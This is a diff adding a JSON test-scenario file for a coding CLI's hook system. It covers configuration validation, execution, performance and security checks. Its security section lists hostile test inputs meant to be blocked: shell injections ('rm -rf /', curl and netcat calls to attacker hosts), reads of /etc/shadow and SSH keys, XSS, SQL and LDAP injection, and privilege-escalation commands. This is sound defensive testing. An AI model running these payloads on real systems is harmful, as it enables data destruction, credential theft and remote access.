@@ -1,0 +1,492 @@
+{
+  "hooks_validation": {
+    "description": "Comprehensive validation of hook configuration files and syntax",
+    "scenarios": [
+      {
+        "name": "syntax_validation",
+        "description": "Validate TOML syntax and structure of hooks.toml files",
+        "test_cases": [
+          {
+            "name": "valid_basic_config",
+            "description": "Test a basic valid hooks configuration",
+            "input_file": "test-data/hooks/valid-basic.toml",
+            "expected_result": "valid",
+            "validation_rules": ["toml_syntax", "required_fields", "data_types"]
+          },
+          {
+            "name": "invalid_syntax",
+            "description": "Test configuration with syntax errors",
+            "input_file": "test-data/hooks/invalid-syntax.toml",
+            "expected_result": "invalid",
+            "expected_errors": ["syntax_error"]
+          },
+          {
+            "name": "missing_required_fields",
+            "description": "Test configuration missing required fields",
+            "input_file": "test-data/hooks/missing-fields.toml",
+            "expected_result": "invalid",
+            "expected_errors": ["missing_required_field"]
+          }
+        ]
+      },
+      {
+        "name": "parameter_validation",
+        "description": "Validate hook parameters and their types",
+        "test_cases": [
+          {
+            "name": "valid_script_hook",
+            "description": "Test valid script hook configuration",
+            "input_file": "test-data/hooks/valid-script.toml",
+            "expected_result": "valid",
+            "validation_rules": ["script_path_exists", "executable_permissions"]
+          },
+          {
+            "name": "valid_webhook_hook",
+            "description": "Test valid webhook hook configuration",
+            "input_file": "test-data/hooks/valid-webhook.toml",
+            "expected_result": "valid",
+            "validation_rules": ["url_format", "http_method", "headers"]
+          },
+          {
+            "name": "invalid_script_path",
+            "description": "Test script hook with non-existent script",
+            "input_file": "test-data/hooks/invalid-script-path.toml",
+            "expected_result": "invalid",
+            "expected_errors": ["script_not_found"]
+          }
+        ]
+      },
+      {
+        "name": "condition_testing",
+        "description": "Test hook condition expressions and logic",
+        "test_cases": [
+          {
+            "name": "simple_conditions",
+            "description": "Test basic condition expressions",
+            "conditions": [
+              "event_type == 'session_start'",
+              "task_id != null",
+              "model == 'gpt-4'"
+            ],
+            "test_contexts": [
+              {
+                "event_type": "session_start",
+                "task_id": "123",
+                "model": "gpt-4"
+              },
+              {
+                "event_type": "session_end",
+                "task_id": null,
+                "model": "gpt-3.5"
+              }
+            ]
+          },
+          {
+            "name": "complex_conditions",
+            "description": "Test complex condition expressions with logical operators",
+            "conditions": [
+              "event_type == 'task_complete' && success == true",
+              "model in ['gpt-4', 'gpt-4-turbo'] || priority == 'high'"
+            ],
+            "test_contexts": [
+              {
+                "event_type": "task_complete",
+                "success": true,
+                "model": "gpt-4",
+                "priority": "normal"
+              },
+              {
+                "event_type": "task_start",
+                "success": false,
+                "model": "gpt-3.5",
+                "priority": "high"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "name": "permission_checking",
+        "description": "Validate file permissions and access rights",
+        "test_cases": [
+          {
+            "name": "script_executable",
+            "description": "Verify script files have executable permissions",
+            "script_paths": [
+              "test-data/scripts/executable.sh",
+              "test-data/scripts/non-executable.sh"
+            ],
+            "expected_permissions": ["755", "644"]
+          },
+          {
+            "name": "config_readable",
+            "description": "Verify configuration files are readable",
+            "config_paths": [
+              "test-data/hooks/readable.toml",
+              "test-data/hooks/restricted.toml"
+            ],
+            "expected_access": ["readable", "not_readable"]
+          }
+        ]
+      }
+    ]
+  },
+  "e2e_testing": {
+    "description": "End-to-end testing of hook execution and integration",
+    "scenarios": [
+      {
+        "name": "hook_execution",
+        "description": "Test actual hook execution with Codex CLI",
+        "test_cases": [
+          {
+            "name": "script_hook_execution",
+            "description": "Execute a simple script hook",
+            "hook_config": "test-data/hooks/simple-script.toml",
+            "trigger_event": "session_start",
+            "expected_output": "Hook executed successfully",
+            "timeout": 30
+          },
+          {
+            "name": "webhook_hook_execution",
+            "description": "Execute a webhook hook",
+            "hook_config": "test-data/hooks/simple-webhook.toml",
+            "trigger_event": "task_complete",
+            "webhook_server": "http://localhost:8081/webhook",
+            "expected_response": 200,
+            "timeout": 30
+          },
+          {
+            "name": "multiple_hooks_execution",
+            "description": "Execute multiple hooks in sequence",
+            "hook_config": "test-data/hooks/multiple-hooks.toml",
+            "trigger_event": "session_end",
+            "expected_execution_order": ["hook1", "hook2", "hook3"],
+            "timeout": 60
+          }
+        ]
+      },
+      {
+        "name": "error_handling",
+        "description": "Test error handling and recovery mechanisms",
+        "test_cases": [
+          {
+            "name": "script_failure",
+            "description": "Test handling of script execution failures",
+            "hook_config": "test-data/hooks/failing-script.toml",
+            "trigger_event": "task_start",
+            "expected_error": "script_execution_failed",
+            "error_recovery": "continue_execution"
+          },
+          {
+            "name": "webhook_timeout",
+            "description": "Test handling of webhook timeouts",
+            "hook_config": "test-data/hooks/slow-webhook.toml",
+            "trigger_event": "task_complete",
+            "webhook_delay": 45,
+            "timeout": 30,
+            "expected_error": "webhook_timeout"
+          },
+          {
+            "name": "network_failure",
+            "description": "Test handling of network failures",
+            "hook_config": "test-data/hooks/unreachable-webhook.toml",
+            "trigger_event": "session_start",
+            "expected_error": "network_unreachable",
+            "retry_attempts": 3
+          }
+        ]
+      },
+      {
+        "name": "integration_testing",
+        "description": "Test integration with external systems",
+        "test_cases": [
+          {
+            "name": "slack_integration",
+            "description": "Test Slack webhook integration",
+            "hook_config": "test-data/hooks/slack-webhook.toml",
+            "trigger_event": "session_complete",
+            "mock_slack_server": "http://localhost:8082/slack",
+            "expected_message_format": "json",
+            "required_fields": ["text", "channel"]
+          },
+          {
+            "name": "database_logging",
+            "description": "Test database logging integration",
+            "hook_config": "test-data/hooks/db-logger.toml",
+            "trigger_event": "task_complete",
+            "database_connection": "postgresql://qa_user:qa_password@localhost:5432/qa_test",
+            "expected_table": "hook_logs",
+            "expected_columns": ["timestamp", "event_type", "data"]
+          }
+        ]
+      },
+      {
+        "name": "regression_testing",
+        "description": "Test for regressions in hook functionality",
+        "test_cases": [
+          {
+            "name": "backward_compatibility",
+            "description": "Test backward compatibility with older hook configurations",
+            "legacy_configs": [
+              "test-data/hooks/legacy-v1.toml",
+              "test-data/hooks/legacy-v2.toml"
+            ],
+            "expected_behavior": "compatible",
+            "migration_warnings": true
+          },
+          {
+            "name": "performance_regression",
+            "description": "Test for performance regressions",
+            "hook_config": "test-data/hooks/performance-test.toml",
+            "baseline_execution_time": 5.0,
+            "max_acceptable_slowdown": 1.2,
+            "iterations": 10
+          }
+        ]
+      }
+    ]
+  },
+  "performance_benchmarks": {
+    "description": "Performance testing and benchmarking of hook system",
+    "scenarios": [
+      {
+        "name": "execution_overhead",
+        "description": "Measure hook execution overhead",
+        "test_cases": [
+          {
+            "name": "minimal_hook_overhead",
+            "description": "Measure overhead of minimal hook execution",
+            "hook_config": "test-data/hooks/minimal.toml",
+            "iterations": 100,
+            "metrics": ["execution_time", "memory_usage", "cpu_usage"],
+            "baseline_without_hooks": true
+          },
+          {
+            "name": "complex_hook_overhead",
+            "description": "Measure overhead of complex hook execution",
+            "hook_config": "test-data/hooks/complex.toml",
+            "iterations": 50,
+            "metrics": [
+              "execution_time",
+              "memory_usage",
+              "cpu_usage",
+              "io_operations"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "concurrent_hooks",
+        "description": "Test performance with concurrent hook execution",
+        "test_cases": [
+          {
+            "name": "parallel_script_hooks",
+            "description": "Execute multiple script hooks in parallel",
+            "hook_configs": [
+              "test-data/hooks/parallel-1.toml",
+              "test-data/hooks/parallel-2.toml",
+              "test-data/hooks/parallel-3.toml"
+            ],
+            "concurrency_levels": [1, 2, 4, 8],
+            "metrics": [
+              "total_execution_time",
+              "throughput",
+              "resource_contention"
+            ]
+          },
+          {
+            "name": "mixed_hook_types",
+            "description": "Execute mixed hook types concurrently",
+            "hook_config": "test-data/hooks/mixed-types.toml",
+            "concurrent_events": 10,
+            "metrics": [
+              "execution_time_distribution",
+              "success_rate",
+              "error_rate"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "memory_usage",
+        "description": "Monitor memory usage patterns",
+        "test_cases": [
+          {
+            "name": "memory_leak_detection",
+            "description": "Detect memory leaks in long-running hook execution",
+            "hook_config": "test-data/hooks/long-running.toml",
+            "duration": 300,
+            "sampling_interval": 5,
+            "memory_growth_threshold": 0.1
+          },
+          {
+            "name": "peak_memory_usage",
+            "description": "Measure peak memory usage under load",
+            "hook_config": "test-data/hooks/memory-intensive.toml",
+            "load_levels": [10, 50, 100, 200],
+            "metrics": ["peak_memory", "average_memory", "memory_efficiency"]
+          }
+        ]
+      },
+      {
+        "name": "cpu_usage",
+        "description": "Monitor CPU usage patterns",
+        "test_cases": [
+          {
+            "name": "cpu_intensive_hooks",
+            "description": "Test CPU usage with intensive hooks",
+            "hook_config": "test-data/hooks/cpu-intensive.toml",
+            "duration": 60,
+            "metrics": ["cpu_utilization", "cpu_efficiency", "thermal_impact"]
+          },
+          {
+            "name": "cpu_scaling",
+            "description": "Test CPU usage scaling with load",
+            "hook_config": "test-data/hooks/scalable.toml",
+            "load_pattern": "linear_increase",
+            "max_load": 1000,
+            "metrics": ["cpu_scaling_factor", "saturation_point"]
+          }
+        ]
+      }
+    ]
+  },
+  "security_tests": {
+    "description": "Security testing and vulnerability assessment",
+    "scenarios": [
+      {
+        "name": "input_validation",
+        "description": "Test input validation and sanitization",
+        "test_cases": [
+          {
+            "name": "command_injection",
+            "description": "Test protection against command injection",
+            "malicious_inputs": [
+              "; rm -rf /",
+              "$(curl malicious.com)",
+              "`cat /etc/passwd`",
+              "| nc attacker.com 4444"
+            ],
+            "expected_behavior": "blocked_or_sanitized"
+          },
+          {
+            "name": "path_traversal",
+            "description": "Test protection against path traversal attacks",
+            "malicious_paths": [
+              "../../../etc/passwd",
+              "..\\..\\..\\windows\\system32",
+              "/etc/shadow",
+              "~/.ssh/id_rsa"
+            ],
+            "expected_behavior": "access_denied"
+          },
+          {
+            "name": "script_injection",
+            "description": "Test protection against script injection",
+            "malicious_scripts": [
+              "<script>alert('xss')</script>",
+              "javascript:alert('xss')",
+              "eval('malicious_code')",
+              "exec('rm -rf /')"
+            ],
+            "expected_behavior": "sanitized_or_blocked"
+          }
+        ]
+      },
+      {
+        "name": "permission_boundaries",
+        "description": "Test permission and access control boundaries",
+        "test_cases": [
+          {
+            "name": "file_access_boundaries",
+            "description": "Test file access restrictions",
+            "restricted_paths": [
+              "/etc/passwd",
+              "/root/.ssh",
+              "/var/log/auth.log",
+              "/proc/version"
+            ],
+            "expected_behavior": "access_denied"
+          },
+          {
+            "name": "network_access_boundaries",
+            "description": "Test network access restrictions",
+            "restricted_endpoints": [
+              "http://malicious.com",
+              "ftp://internal.server.com",
+              "ssh://production.server.com",
+              "telnet://legacy.system.com"
+            ],
+            "expected_behavior": "connection_blocked"
+          },
+          {
+            "name": "privilege_escalation",
+            "description": "Test protection against privilege escalation",
+            "escalation_attempts": [
+              "sudo su -",
+              "chmod +s /bin/bash",
+              "setuid(0)",
+              "docker run --privileged"
+            ],
+            "expected_behavior": "escalation_blocked"
+          }
+        ]
+      },
+      {
+        "name": "injection_prevention",
+        "description": "Test various injection attack prevention",
+        "test_cases": [
+          {
+            "name": "sql_injection",
+            "description": "Test SQL injection prevention in database hooks",
+            "malicious_queries": [
+              "'; DROP TABLE users; --",
+              "' OR '1'='1",
+              "UNION SELECT * FROM passwords",
+              "'; EXEC xp_cmdshell('dir'); --"
+            ],
+            "expected_behavior": "query_sanitized_or_blocked"
+          },
+          {
+            "name": "ldap_injection",
+            "description": "Test LDAP injection prevention",
+            "malicious_filters": [
+              "*)(&",
+              "*)(uid=*",
+              "admin)(&(password=*",
+              "*)(|(password=*))"
+            ],
+            "expected_behavior": "filter_sanitized"
+          }
+        ]
+      },
+      {
+        "name": "access_control",
+        "description": "Test access control mechanisms",
+        "test_cases": [
+          {
+            "name": "unauthorized_hook_execution",
+            "description": "Test prevention of unauthorized hook execution",
+            "unauthorized_configs": [
+              "test-data/hooks/admin-only.toml",
+              "test-data/hooks/restricted.toml"
+            ],
+            "user_context": "limited_user",
+            "expected_behavior": "execution_denied"
+          },
+          {
+            "name": "configuration_tampering",
+            "description": "Test protection against configuration tampering",
+            "tampering_attempts": [
+              "modify_hook_script_path",
+              "change_webhook_url",
+              "alter_execution_conditions",
+              "inject_malicious_parameters"
+            ],
+            "expected_behavior": "tampering_detected_and_blocked"
+          }
+        ]
+      }
+    ]
+  }
+}
